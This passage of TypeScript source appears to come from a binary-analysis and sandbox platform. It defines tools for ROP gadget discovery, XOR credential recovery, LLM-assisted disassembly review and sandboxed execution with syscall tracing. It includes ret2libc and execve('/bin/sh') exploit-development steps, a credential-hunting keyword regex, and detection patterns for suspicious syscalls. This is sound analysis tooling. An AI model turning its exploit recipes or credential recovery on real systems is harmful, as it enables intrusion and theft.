        popRsiGadgets.length   ? `\npop rsi ; ret gadgets — x86_64 second-arg setup (${popRsiGadgets.length}):\n  ${popRsiGadgets.slice(0, 5).join('\n  ')}` : '',
        popRspGadgets.length   ? `\nStack pivot gadgets (pop rsp / push rsp) (${popRspGadgets.length}):\n  ${popRspGadgets.slice(0, 5).join('\n  ')}` : '',
        retGadgets.length      ? `\nStack-alignment ret gadget: ${retGadgets[0] ?? ''}` : '',
        callGadgets.length     ? `\ncall reg gadgets — indirect control flow (${callGadgets.length}):\n  ${callGadgets.slice(0, 5).join('\n  ')}` : '',
        jmpGadgets.length      ? `\njmp reg gadgets (${jmpGadgets.length}):\n  ${jmpGadgets.slice(0, 5).join('\n  ')}` : '',
        writableGadgets.length ? `\nMemory-write gadgets — useful for rop2shellcode (${writableGadgets.length}):\n  ${writableGadgets.slice(0, 5).join('\n  ')}` : '',
      ].filter(Boolean).join('\n');

      const isExploitable = popRdiGadgets.length > 0 || syscallGadgets.length > 0 || popRspGadgets.length > 0;
      const hasAnyGadgets = totalCount > 5;

      const keyGadgetList = [
        popRdiGadgets.length  ? `${popRdiGadgets.length} × pop rdi;ret`  : '',
        popRsiGadgets.length  ? `${popRsiGadgets.length} × pop rsi;ret`  : '',
        syscallGadgets.length ? `${syscallGadgets.length} × syscall`      : '',
        popRspGadgets.length  ? `${popRspGadgets.length} × stack pivot`   : '',
        callGadgets.length    ? `${callGadgets.length} × call reg`         : '',
        jmpGadgets.length     ? `${jmpGadgets.length} × jmp reg`           : '',
        writableGadgets.length ? `${writableGadgets.length} × mem-write`  : '',
      ].filter(Boolean).join(', ');

      const findings = (isExploitable || hasAnyGadgets) ? [{
        title: isExploitable
          ? `ROP gadgets found — binary is exploitable via ROP chains`
          : `ROP gadgets present — ${totalCount} gadgets found (no high-value ret2libc chains; memory corruption may still pivot via call/jmp reg)`,
        severity: isExploitable ? 'high' as const : 'medium' as const,
        details: `Found ${totalCount} ROP gadgets in ${fname}.\n` +
          `Key gadgets: ${keyGadgetList || '(none in standard high-value categories)'}.\n` +
          `ret2libc chain feasibility: ${popRdiGadgets.length > 0 ? 'HIGH — pop rdi;ret gadget available for argument setup' : 'LOW — no pop rdi;ret gadget found; check call/jmp reg gadgets for indirect control flow'}.\n` +
          (syscallGadgets.length > 0 ? `Syscall-based ROP chain feasible — system call gadgets present.\n` : '') +
          (callGadgets.length > 0 || jmpGadgets.length > 0 ? `Indirect control-flow gadgets available (call/jmp reg) — usable for ret2plt or sigrop chains.` : ''),
        provenance: 'tool' as const,
        toolName: 'binary_rop_gadgets',
        toolOutput: `${totalCount} gadgets; pop rdi;ret: ${popRdiGadgets[0] ?? 'none'}; syscall: ${syscallGadgets[0] ?? 'none'}; call reg: ${callGadgets[0] ?? 'none'}`,
      }] : undefined;

      const nextSteps = [
        popRdiGadgets.length > 0
          ? `ret2libc attack setup: use ${popRdiGadgets[0]} to load /bin/sh address into RDI, then call system()`
          : '',
        syscallGadgets.length > 0
          ? `Syscall chain: set RAX=0x3b (execve), RDI→"/bin/sh", RSI=0, RDX=0, then ${syscallGadgets[0]}`
          : '',
        `Run llm_binary_review(binary_path, focus="memory_corruption") to identify the overflow entry point to reach these gadgets`,
      ].filter(Boolean).join('\n');

      return {
        success: true,
        output: `=== ROP GADGET ANALYSIS: ${fname} ===\n\n${summary || '(no high-value gadgets found)'}\n\nNEXT STEPS FOR EXPLOIT DEVELOPMENT:\n${nextSteps}`,
        findings,
        additionalEvidence: [{ type: 'command' as const, content: `ROPgadget --binary "${filePath}" --rop` }],
      };
    },
  },
  {
    name: 'binary_xor_decode',
    description: 'Behavioral XOR obfuscation detector — works on stripped binaries without needing symbol names. Finds XOR decode loops by opcode pattern (xor-in-loop structure in disassembly), extracts the key byte from the instruction immediate, then decodes all data sections to recover hidden credentials, keys, and config. Also brute-forces all 256 keys against the binary data sections as a fallback.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target binary — local:// reference or plain filename', required: true },
      { name: 'key', type: 'number', description: 'Known XOR key byte (0–255). Omit to auto-detect behaviorally.', required: false },
    ],
    handler: async (context) => {
      const rawPath  = String(context.parameters.binary_path ?? '').trim();
      const knownKey = context.parameters.key != null ? Number(context.parameters.key) : null;
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // Full behavioral analysis — runs entirely inside the sidecar via Python calling r2.
      // No reliance on function names: finds XOR loops by opcode pattern + loop structure.
      const knownKeyArg = knownKey != null ? String(knownKey) : '';
      const pyScript = `
import subprocess, re, sys, json

binary = sys.argv[1]
forced_key = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2] else None

# All r2 calls MUST chain 'aaa' — each subprocess starts fresh with no prior analysis.
def r2(cmd, timeout=60):
    try:
        r = subprocess.run(
            ['r2', '-q', '-c', f'aaa 2>/dev/null; {cmd}', binary],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout
    except Exception as e:
        return ''

print('[*] Running radare2 analysis + XOR instruction search...')

# ── STEP 1: Find all XOR instructions (text scan of disassembly, works without symbols) ──
# /ad xor does a text match in disassembled output — reliable without prior analysis state
xor_addrs_raw = r2('/ad xor')
xor_lines_found = [l for l in xor_addrs_raw.splitlines() if re.match(r'\\s*0x', l) and 'xor' in l.lower()]
print(f'[*] XOR instruction lines found: {len(xor_lines_found)}')

key_candidates = {}   # key_byte -> {addr, instr, is_loop, is_reg_indirect, evidence, call_site_key}
loop_functions = []   # addresses of functions containing XOR loops (for call-site tracing)

if forced_key is None:
    for line in xor_lines_found:
        m = re.match(r'\\s*(0x[0-9a-f]+)', line, re.I)
        if not m:
            continue
        addr_int = int(m.group(1), 16)

        # Get ~35 instructions centred on this XOR (go back 80 bytes to catch loop start)
        ctx_addr = hex(max(0, addr_int - 80))
        ctx = r2(f'pd 35 @ {ctx_addr}')

        xor_line = next(
            (l for l in ctx.splitlines() if re.search(rf'\\b{m.group(1)[2:]}\\b', l, re.I) and 'xor' in l.lower()),
            line
        )

        # Loop structure indicators in context window
        has_jump  = bool(re.search(r'\\bjn[ez]\\b|\\bjl[e]?\\b|\\bjg[e]?\\b|\\bjb[e]?\\b|\\bjae\\b', ctx, re.I))
        has_ctr   = bool(re.search(r'\\b(inc|dec|add)\\b.{1,40}\\b[re]?(cx|ax|bx|dx|si|di|[89]|1[0-5])\\b', ctx, re.I))
        has_memrw = bool(re.search(r'(mov|movzx|movsx).*\\[', ctx, re.I))
        is_loop   = has_jump and has_ctr

        # ── Key extraction: immediate form ──────────────────────────────────────
        # "xor byte [rbp-X], 0xNN"  /  "xor al, 0xNN"
        k_imm = re.search(r'xor\\b[^;\\n]{0,50}[,\\s](0x[0-9a-f]{1,2})\\s*(?:;.*)?$', xor_line, re.I)
        if not k_imm:
            k_imm = re.search(r'xor\\b.*?[,\\s](0x[0-9a-f]{1,2})(?:\\b|$)', xor_line, re.I)
        if k_imm:
            kv = int(k_imm.group(1), 16)
            if 1 <= kv <= 254:
                if kv not in key_candidates or (is_loop and not key_candidates[kv].get('is_loop')):
                    key_candidates[kv] = {
                        'addr': m.group(1), 'instr': xor_line.strip()[:100],
                        'is_loop': is_loop, 'is_reg_indirect': False,
                        'has_memrw': has_memrw, 'evidence': ctx[:300],
                    }

        # ── Key extraction: register-indirect form ─────────────────────────────
        # "xor al, byte [rbp-X]"  /  "xor al, byte [var_1dh]"
        # The key comes from a register loaded before the call — trace call sites
        elif is_loop and re.search(r'xor\\b.{0,20},\\s*byte\\b', xor_line, re.I):
            print(f'[*] Register-indirect XOR loop @ {m.group(1)} — tracing call sites for key')
            loop_functions.append(m.group(1))

    # ── Call-site tracing for register-indirect XOR loops ─────────────────────
    # Find XREFs to functions containing the loop, look for key loaded into dl/edx/bl
    for fn_addr in loop_functions[:4]:
        xrefs_raw = r2(f'axt {fn_addr}')
        for xref_line in xrefs_raw.splitlines():
            call_m = re.match(r'.*?\\b(0x[0-9a-f]{4,})\\b', xref_line, re.I)
            if not call_m:
                continue
            call_addr = int(call_m.group(1), 16)
            # Disassemble the 15 instructions before the call to find the key argument
            pre_ctx = r2(f'pd -15 @ {hex(call_addr + 4)}')
            # Key argument is any byte-sized immediate loaded into any GP register
            # in the pre-call window (handles indirect paths: eax->ebx->movzx edx,bl)
            key_m = re.search(
                r'mov\\s+(?:[re]?[abcd]x|[abcd][lh]|[re]?(?:si|di|sp|bp)|r\\d+[db]?)\\s*,\\s*(0x[0-9a-f]{1,2})\\b',
                pre_ctx, re.I
            )
            if key_m:
                kv = int(key_m.group(1), 16)
                if 1 <= kv <= 254:
                    print(f'    → Call-site key=0x{kv:02X} from {hex(call_addr)}: {key_m.group(0).strip()}')
                    if kv not in key_candidates:
                        key_candidates[kv] = {
                            'addr': fn_addr, 'instr': f'xor loop (key from call site @ {hex(call_addr)})',
                            'is_loop': True, 'is_reg_indirect': True,
                            'has_memrw': True, 'evidence': pre_ctx[:300],
                        }

    # Rank: loop-based first, then memory-write XOR, then plain
    ranked = sorted(key_candidates.items(),
                    key=lambda x: (not x[1]['is_loop'], not x[1].get('is_reg_indirect', False), not x[1]['has_memrw']))
    if ranked:
        print(f'[*] Detected XOR key candidates from disassembly:')
        for kv, info in ranked[:6]:
            flag = ' [LOOP+CALL-SITE]' if info.get('is_reg_indirect') else (' [LOOP]' if info['is_loop'] else '')
            print(f'    key=0x{kv:02X}{flag} @ {info["addr"]}  →  {info["instr"]}')
    else:
        print('[!] No XOR patterns found via opcode scan')
        print('[*] Falling back to common key brute-force')
        for k_fallback in [0x5A, 0x3C, 0xFF, 0xAA, 0x69, 0x55, 0x41, 0x7F, 0x13, 0x37]:
            key_candidates[k_fallback] = {'addr': 'heuristic', 'instr': '', 'is_loop': False, 'is_reg_indirect': False, 'has_memrw': False, 'evidence': ''}
else:
    key_candidates[forced_key] = {'addr': 'user-supplied', 'instr': '', 'is_loop': True, 'is_reg_indirect': False, 'has_memrw': True, 'evidence': ''}
    print(f'[*] Using supplied key: 0x{forced_key:02X}')

# ── STEP 2: Dump binary data sections to decode (not the full binary) ─────────
sections_raw = r2('iS')
sections_to_check = []
for sline in sections_raw.splitlines():
    # Match: addr  sz  vaddr  vsz  name  perm
    parts = sline.split()
    sec_match = re.search(r'(\\.(?:data|rodata|bss|rdata|DATA|RDATA))(?:\\b|$)', sline)
    addr_match = re.search(r'(0x[0-9a-f]{6,})', sline)
    size_match = re.search(r'(0x[0-9a-f]+)\\s+(0x[0-9a-f]+)\\s+(0x[0-9a-f]+)', sline)
    if sec_match and addr_match:
        # Find the size field
        sizes = re.findall(r'\\b(0x[0-9a-f]+)\\b', sline)
        vaddr = addr_match.group(1)
        # Pick a reasonable size (not too big)
        size = 0
        for s in sizes[1:]:
            sv = int(s, 16)
            if 8 <= sv <= 65536:
                size = sv
                break
        if size > 0:
            sections_to_check.append({'name': sec_match.group(1), 'addr': vaddr, 'size': size})

# Fallback: read entire binary
if not sections_to_check:
    print('[*] No data sections found via iS — decoding full binary')
    with open(binary, 'rb') as f:
        raw_data = f.read()
    sections_to_check = [{'name': 'binary', 'addr': '0x0', 'size': len(raw_data), '_raw': raw_data}]

# Read section bytes
for sec in sections_to_check:
    if '_raw' not in sec:
        hex_dump = r2(f'px {sec["size"]} @ {sec["addr"]}')
        raw_bytes = bytes(int(h, 16) for h in re.findall(r'\\b([0-9a-f]{2})\\b', hex_dump)[:sec['size']])
        sec['_raw'] = raw_bytes

# Also always read full binary for brute-force
with open(binary, 'rb') as f:
    full_binary = f.read()

# ── STEP 3: Decode with each key candidate ────────────────────────────────────
cred_re = re.compile(
    r'(?:admin|password|passwd|secret|token|key|login|auth|user|prod|corp|backup|db|'
    r'postgresql|mysql|redis|aws|azure|gcp|s3|bucket|bearer|private|public|rsa|pem|'
    r'AKIA|BEGIN|END|ssh-rsa|ssh-ed)',
    re.I
)

print('\\n=== DECODE RESULTS ===')
any_found = False

# Sort: loop-detected first
sorted_keys = sorted(key_candidates.items(), key=lambda x: (not x[1]['is_loop'], not x[1]['has_memrw']))

for kv, kinfo in sorted_keys[:20]:
    # Try decoding data sections first, then full binary
    all_hits = []
    for sec in sections_to_check:
        raw = sec.get('_raw', b'')
        decoded = bytes(b ^ kv for b in raw)
        for m in re.finditer(rb'[\\x20-\\x7e]{8,}', decoded):
            s = m.group().decode('ascii', errors='ignore').strip()
            if cred_re.search(s):
                all_hits.append(s[:120])

    # Also try full binary if sections gave nothing
    if not all_hits:
        decoded_full = bytes(b ^ kv for b in full_binary)
        for m in re.finditer(rb'[\\x20-\\x7e]{10,}', decoded_full):
            s = m.group().decode('ascii', errors='ignore').strip()
            if cred_re.search(s):
                all_hits.append(s[:120])

    if all_hits:
        any_found = True
        loop_flag = ' [XOR DECODE LOOP — behavioral detection]' if kinfo['is_loop'] else ' [key candidate]'
        reg_flag  = ' [call-site key tracing]' if kinfo.get('is_reg_indirect') else ''
        print(f'\\nXOR key=0x{kv:02X}{loop_flag}{reg_flag}')
        print(f'  Detected at: {kinfo["addr"]}  instruction: {kinfo["instr"]}')
        seen = set()
        for h in all_hits:
            if h not in seen:
                seen.add(h)
                print(f'  DECODED: {h}')
            if len(seen) >= 10:
                break

# Emit loop findings even when data decode produces no hits (runtime-only encryption is still a finding)
loop_keys = [(kv, info) for kv, info in sorted_keys if info['is_loop']]
if not any_found and loop_keys:
    print('\\n[!] XOR LOOP DETECTED — runtime encryption (no static data decoded)')
    for kv, info in loop_keys[:4]:
        src = 'call-site tracing' if info.get('is_reg_indirect') else 'immediate'
        print(f'  XOR key=0x{kv:02X} (via {src}) @ {info["addr"]}')
        print(f'  Instruction: {info["instr"]}')
    print('[*] Key encrypts runtime buffers — use sandbox_execute or sandbox_trace for dynamic recovery.')

if not any_found and not loop_keys:
    print('[*] No XOR patterns or credential strings found in decoded output.')
    print(f'    Keys tried: {[hex(k) for k, _ in sorted_keys[:10]]}')
    print('[*] Binary may use multi-byte XOR, RC4, AES, or other cipher.')
    print('[*] Try ghidra_decompile on functions that reference .data section addresses.')
`.trimStart();

      const args = ['python3', '-c', pyScript, filePath];
      if (knownKeyArg) args.push(knownKeyArg);
      const pyResult = await callSidecar('binary', args[0], args.slice(1), {}, 120000);
      const output = pyResult.stdout || pyResult.stderr || '(no output from XOR analysis)';

      const hasDecoded = /DECODED:|XOR key=/.test(output);
      const loopDetected = /XOR DECODE LOOP|XOR LOOP DETECTED/.test(output);

      const findings = (hasDecoded || loopDetected) ? [{
        title: hasDecoded
          ? 'XOR-obfuscated credentials recovered via behavioral loop detection'
          : 'XOR encryption loop detected — runtime key obfuscation (use sandbox for dynamic recovery)',
        severity: hasDecoded ? 'critical' as const : 'high' as const,
        details: output.slice(0, 2000),
        provenance: 'tool' as const,
        toolName: 'binary_xor_decode',
        toolOutput: output.slice(0, 400),
      }] : undefined;

      return {
        success: true,
        output: `=== BEHAVIORAL XOR ANALYSIS: ${fname} ===\n\n${output}`,
        findings,
        additionalEvidence: [{ type: 'command' as const, content: `binary_xor_decode("${rawPath}")` }],
      };
    },
  },
  {
    name: 'binary_investigate',
    description: 'Dynamic deep-dive into any address or function — works on stripped binaries without symbol names. Pass an address (0x401234) or any function name. Returns full disassembly, callers, callees, string references, and an LLM interpretation of what the code does and what vulnerabilities it contains. Also suggests the next addresses to investigate. Use this iteratively to trace suspicious code paths.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target binary — local:// reference or plain filename', required: true },
      { name: 'target', type: 'string', description: 'Address (e.g. 0x401234) or name (e.g. fcn.00401234, sym.main, main). Address form works on stripped binaries.', required: true },
      { name: 'hypothesis', type: 'string', description: 'What you suspect this code does — e.g. "XOR decode loop", "C2 callback", "auth bypass". Guides the LLM analysis.', required: false, default: '' },
    ],
    handler: async (context) => {
      const llm        = context.llm as LLMBackbone | undefined;
      const rawPath    = String(context.parameters.binary_path  ?? '').trim();
      const target     = String(context.parameters.target       ?? '').trim();
      const hypothesis = String(context.parameters.hypothesis   ?? '').trim();
      if (!rawPath || !target) return { success: false, error: 'binary_path and target are required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // Parallel: full disassembly + caller/callee cross-refs + string refs + data refs
      const r2Cmds = `aaa; pdf @ ${target}; axt @ ${target}; axf @ ${target}`;
      const [mainOut, strOut] = await Promise.all([
        callSidecar('binary', 'r2', ['-q', '-c', r2Cmds, filePath], {}, 90000),
        callSidecar('binary', 'r2', ['-q', '-c', `aaa; s ${target}; iz; axr @ ${target}`, filePath], {}, 45000),
      ]);

      const disasmText = mainOut.stdout.slice(0, 6000);
      const refsText   = strOut.stdout.slice(0, 2000);

      if (disasmText.length < 30) {
        return {
          success: false,
          error: `binary_investigate: no disassembly for "${target}" — verify the address/name exists. Use binary_functions first to get valid addresses.`,
        };
      }

      const evidence = [
        `=== DISASSEMBLY: ${target} ===\n${disasmText}`,
        refsText.trim() ? `=== CROSS-REFERENCES & STRINGS ===\n${refsText}` : '',
      ].filter(Boolean).join('\n\n');

      // LLM interpretation — the key feature that makes this tool "dynamic"
      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'model'; toolName: string; toolOutput?: string }> = [];
      let llmSections = '';

      if (llm) {
        const prompt = `Analyze this binary function at ${target}:
${hypothesis ? `Analyst hypothesis: ${hypothesis}\n` : ''}
${evidence.slice(0, 9000)}

Tasks:
1. State the PURPOSE of this function (what it does).
2. List any VULNERABILITIES with exact evidence from the disassembly.
3. List any INTERESTING DATA (credentials, keys, IPs, strings, encoded bytes).
4. List SUSPICIOUS BEHAVIORS (anti-debug, network, shell, XOR/encode, memory tricks).
5. Identify 1–4 NEXT TARGETS to investigate deeper — provide their addresses from the disassembly.

Return ONLY JSON (no markdown):
{
  "purpose": "...",
  "vulnerabilities": [{"title":"...","severity":"critical|high|medium|low","function":"...","evidence":"...","mitigation":"..."}],
  "interesting_data": [{"type":"credential|key|ip|string|encoded","value":"...","context":"..."}],
  "suspicious_behaviors": ["..."],
  "hypothesis_verdict": "confirmed|refuted|partial|unknown",
  "next_targets": [{"address":"0x...","reason":"why investigate this next"}]
}`;

        try {
          const raw = await llm.prompt(prompt,
            'You are an expert binary reverse engineer. Analyze disassembly precisely — cite specific instructions and addresses.',
            { maxTokens: 2500 });

          const jsonMatch = raw.match(/\{[\s\S]*\}/);
          if (jsonMatch) {
            const parsed = JSON.parse(jsonMatch[0]) as {
              purpose?: string;
              vulnerabilities?: Array<{ title: string; severity: string; function?: string; evidence?: string; mitigation?: string }>;
              interesting_data?: Array<{ type: string; value: string; context?: string }>;
              suspicious_behaviors?: string[];
              hypothesis_verdict?: string;
              next_targets?: Array<{ address: string; reason: string }>;
            };

            // Emit findings for each vulnerability
            for (const v of (parsed.vulnerabilities ?? [])) {
              findings.push({
                title: v.title,
                severity: (['critical','high','medium','low','info'].includes(v.severity ?? '') ? v.severity : 'medium') as 'critical'|'high'|'medium'|'low'|'info',
                details: `${v.evidence ?? v.title}\n\nFunction: ${v.function ?? target}\nMitigation: ${v.mitigation ?? 'Manual review required.'}`,
                provenance: 'model',
                toolName: 'binary_investigate',
                toolOutput: (v.evidence ?? '').slice(0, 200),
              });
            }

            // Emit findings for interesting data (credentials, embedded keys, etc.)
            const credData = (parsed.interesting_data ?? []).filter(d => ['credential','key','encoded'].includes(d.type));
            if (credData.length > 0) {
              findings.push({
                title: `Sensitive data in ${target}: ${credData.map(d => d.value.slice(0, 40)).join(', ')}`,
                severity: 'high',
                details: credData.map(d => `[${d.type}] ${d.value}  —  ${d.context ?? ''}`).join('\n'),
                provenance: 'model',
                toolName: 'binary_investigate',
                toolOutput: credData.map(d => d.value).join(', ').slice(0, 200),
              });
            }

            // Format LLM output sections for the tool output
            const nextStr = (parsed.next_targets ?? []).map(t =>
              `  binary_investigate(binary_path="${rawPath}", target="${t.address}", hypothesis="${t.reason}")`
            ).join('\n');

            llmSections = [
              `\n=== LLM ANALYSIS ===`,
              `Purpose: ${parsed.purpose ?? 'unknown'}`,
              hypothesis ? `Hypothesis verdict: ${parsed.hypothesis_verdict ?? 'unknown'}` : '',
              parsed.suspicious_behaviors?.length ? `Behaviors: ${parsed.suspicious_behaviors.join('; ')}` : '',
              (parsed.vulnerabilities ?? []).length > 0
                ? `Vulnerabilities:\n${parsed.vulnerabilities!.map(v => `  [${v.severity?.toUpperCase()}] ${v.title} — ${(v.evidence ?? '').slice(0, 120)}`).join('\n')}`
                : '',
              credData.length > 0
                ? `Interesting data:\n${credData.map(d => `  [${d.type}] ${d.value}`).join('\n')}`
                : '',
              nextStr ? `\nSUGGESTED NEXT INVESTIGATIONS (call these to go deeper):\n${nextStr}` : '',
            ].filter(Boolean).join('\n');
          }
        } catch { /* LLM errors don't fail the tool */ }
      }

      return {
        success: true,
        output: `=== DEEP INVESTIGATION: ${target} in ${fname} ===\n\n${evidence}${llmSections}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `binary_investigate(binary="${rawPath}", target="${target}")` }],
      };
    },
  },

  // ══════════════════════════════════════════════════════════════════════════
  // SANDBOX TOOLS — dynamic execution in tempest-sandbox sidecar
  // Supports ELF (QEMU user-mode + LD_PRELOAD anti-debug shim),
  //          PE  (Wine64, Win10 Pro disguise, relay API logging),
  //          Mach-O (Qiling emulation)
  // ══════════════════════════════════════════════════════════════════════════
  {
    name: 'sandbox_execute',
    description: 'Execute a binary in the T3MP3ST dynamic sandbox. Auto-detects format (ELF/PE/Mach-O). ELF runs under QEMU user-mode + LD_PRELOAD anti-debug shim. PE runs under Wine64 (Windows 10 Pro). Mach-O runs under Qiling emulation. Binary is renamed to alias before execution to defeat name-based analysis checks. Returns behavioral summary: process spawns, file ops, network attempts, exit code.',
    category: 'sandbox',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target binary — local:// reference or plain filename', required: true },
      { name: 'network_mode', type: 'string', description: 'none (air-gapped, default) | monitored (outbound allowed + tcpdump) | open (unrestricted)', required: false, default: 'none' },
      { name: 'alias', type: 'string', description: 'Name to give the binary process (e.g. "svchost.exe" or "kworker"). Defeats name-based anti-sandbox checks. Auto-selected from system-name pool if omitted.', required: false, default: '' },
      { name: 'timeout_sec', type: 'number', description: 'Maximum execution time in seconds (default 30)', required: false, default: 30 },
      { name: 'args', type: 'string', description: 'Space-separated arguments to pass to the binary', required: false, default: '' },
    ],
    handler: async (context) => {
      const rawPath    = String(context.parameters.binary_path  ?? '').trim();
      const networkMode = String(context.parameters.network_mode ?? 'none').trim();
      const alias      = String(context.parameters.alias        ?? '').trim();
      const timeoutSec = Number(context.parameters.timeout_sec  ?? 30);
      const binaryArgs = String(context.parameters.args         ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const pyArgs = [
        '/scripts/sandbox_execute.py',
        '--binary', filePath,
        '--network', networkMode,
        '--timeout', String(timeoutSec),
      ];
      if (alias) pyArgs.push('--alias', alias);
      if (binaryArgs) pyArgs.push('--', ...binaryArgs.split(/\s+/).filter(Boolean));

      const result = await callSidecar('sandbox', 'python3', pyArgs, {}, (timeoutSec + 30) * 1000);
      const output = result.stdout || result.stderr || result.error || '(no output)';

      // Parse JSON result block — script emits "=== SANDBOX EXECUTION RESULT ===" header
      let parsed: Record<string, unknown> = {};
      try {
        const jsonMatch = output.match(/=== (?:SANDBOX EXECUTION RESULT|FULL JSON) ===\n([\s\S]+)/);
        if (jsonMatch) parsed = JSON.parse(jsonMatch[1]);
      } catch { /* non-fatal */ }

      const highlights  = (parsed.behavioral_highlights as string[]) ?? [];
      const netSummary  = (parsed.network_summary as Record<string, string[]>) ?? {};

      // Format detection: use parsed JSON first, then fall back to raw output heuristics
      let detectedFmt = String(parsed.format ?? '');
      if (!detectedFmt || detectedFmt === 'unknown') {
        if (/ELF 64-bit|ELF32|ELF-/.test(output)) detectedFmt = 'ELF';
        else if (/PE32\+?|Portable Executable|\.exe/i.test(output)) detectedFmt = 'PE';
        else if (/Mach-O/i.test(output)) detectedFmt = 'Mach-O';
        else detectedFmt = 'unknown';
      }
      const usedAlias = String(parsed.alias ?? alias);

      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'tool'; toolName: string }> = [];

      const exitCode = parsed.exit_code as number | undefined;
      const timedOut = Boolean(parsed.timed_out);

      // Detect when the sidecar ran but didn't emit structured JSON (e.g. binary crashed the script)
      const noJson = Object.keys(parsed).length === 0;
      const execStatusLabel = noJson
        ? `ran (no structured output — binary may have crashed or sandbox script errored)`
        : `${detectedFmt}${usedAlias ? `, alias=${usedAlias}` : ''}, exit=${exitCode ?? '?'}${timedOut ? ' (timed out)' : ''}`;

      // Always emit an execution summary so the operator knows the sandbox ran
      findings.push({
        title: `Sandbox execution: ${execStatusLabel}`,
        severity: 'info' as const,
        details: `Binary executed as "${usedAlias}" (${detectedFmt}), network=${networkMode}\nExit code: ${exitCode ?? 'unknown'}${timedOut ? '\nExecution timed out — binary may be waiting for input or long-running' : ''}\n\nStdout preview:\n${String(parsed.stdout ?? '').slice(0, 300) || '(no stdout)'}\n\nStderr/strace preview:\n${String(parsed.stderr ?? '').slice(0, 500) || '(no stderr)'}`,
        provenance: 'tool',
        toolName: 'sandbox_execute',
      });

      if (highlights.length > 0) {
        findings.push({
          title: `Dynamic behaviors detected: ${highlights.slice(0, 3).join(', ')}`,
          severity: highlights.some(h => /injection|shellcode|credential|shadow/i.test(h)) ? 'critical' : 'high',
          details: `Binary exhibited the following behaviors at runtime:\n${highlights.map(h => `  • ${h}`).join('\n')}\n\nExecuted as: ${usedAlias} (${detectedFmt}), network=${networkMode}`,
          provenance: 'tool',
          toolName: 'sandbox_execute',
        });
      }

      const netConns = (netSummary.tcp_connections ?? []);
      if (netConns.length > 0) {
        findings.push({
          title: `Runtime C2 connection attempts: ${netConns.slice(0, 3).join(', ')}`,
          severity: 'critical',
          details: `Binary attempted TCP connections during execution:\n${netConns.map(c => `  → ${c}`).join('\n')}\nDNS queries: ${(netSummary.dns_queries ?? []).join(', ') || 'none'}`,
          provenance: 'tool',
          toolName: 'sandbox_execute',
        });
      }

      return {
        success: result.exitCode !== undefined,
        output: `=== SANDBOX EXECUTE: ${fname} ===\nFormat: ${detectedFmt}  Alias: ${usedAlias}  Network: ${networkMode}\n\n${output.slice(0, 4000)}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `sandbox_execute("${rawPath}", network="${networkMode}", alias="${usedAlias}")` }],
      };
    },
  },
  {
    name: 'sandbox_trace',
    description: 'Run binary under strace (syscall tracer) or ltrace (library call tracer) in the sandbox. Captures all system calls or library calls with arguments, categorized into: file_ops, network_attempts, process_spawns, crypto_ops, memory_ops, suspicious. Detects execve, ptrace, socket creation, writes to sensitive paths, mprotect(EXEC). Works on ELF binaries. The LD_PRELOAD anti-debug shim is applied automatically.',
    category: 'sandbox',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target ELF binary', required: true },
      { name: 'tracer', type: 'string', description: 'strace (syscall level, default) | ltrace (library call level)', required: false, default: 'strace' },
      { name: 'alias', type: 'string', description: 'Process name alias (defeats name-based anti-debug)', required: false, default: '' },
      { name: 'timeout_sec', type: 'number', description: 'Max execution time (default 30)', required: false, default: 30 },
    ],
    handler: async (context) => {
      const rawPath    = String(context.parameters.binary_path ?? '').trim();
      const tracer     = String(context.parameters.tracer      ?? 'strace').trim();
      const alias      = String(context.parameters.alias       ?? '').trim();
      const timeoutSec = Number(context.parameters.timeout_sec ?? 30);
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const pyArgs = ['/scripts/sandbox_trace.py', '--binary', filePath,
                      '--tracer', tracer, '--timeout', String(timeoutSec)];
      if (alias) pyArgs.push('--alias', alias);

      const result = await callSidecar('sandbox', 'python3', pyArgs, {}, (timeoutSec + 20) * 1000);
      const output = result.stdout || result.stderr || result.error || '(no output)';

      let parsed: Record<string, unknown> = {};
      try {
        const jm = output.match(/=== FULL JSON ===\n([\s\S]+)/);
        if (jm) parsed = JSON.parse(jm[1]);
      } catch { /* non-fatal */ }

      const cats = (parsed.categories as Record<string, unknown[]>) ?? {};
      const suspicious = (cats.suspicious as Array<{flag: string; line: string}>) ?? [];
      const netAttempts = (cats.network_attempts as string[]) ?? [];

      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'tool'; toolName: string }> = [];

      if (suspicious.length > 0) {
        const criticalFlags = suspicious.filter(s => ['execve','ptrace','socket_inet','shadow_read','mprotect_exec','memfd_create'].includes(s.flag));
        findings.push({
          title: `Suspicious syscalls: ${[...new Set(suspicious.map(s => s.flag))].slice(0, 4).join(', ')}`,
          severity: criticalFlags.length > 0 ? 'critical' : 'high',
          details: suspicious.slice(0, 10).map(s => `[${s.flag}] ${s.line}`).join('\n'),
          provenance: 'tool',
          toolName: 'sandbox_trace',
        });
      }
      if (netAttempts.length > 0) {
        findings.push({
          title: `Network syscalls detected during execution`,
          severity: 'high',
          details: netAttempts.slice(0, 10).join('\n'),
          provenance: 'tool',
          toolName: 'sandbox_trace',
        });
      }

      return {
        success: true,
        output: `=== ${tracer.toUpperCase()} TRACE: ${fname} ===\n\n${output.slice(0, 5000)}`,
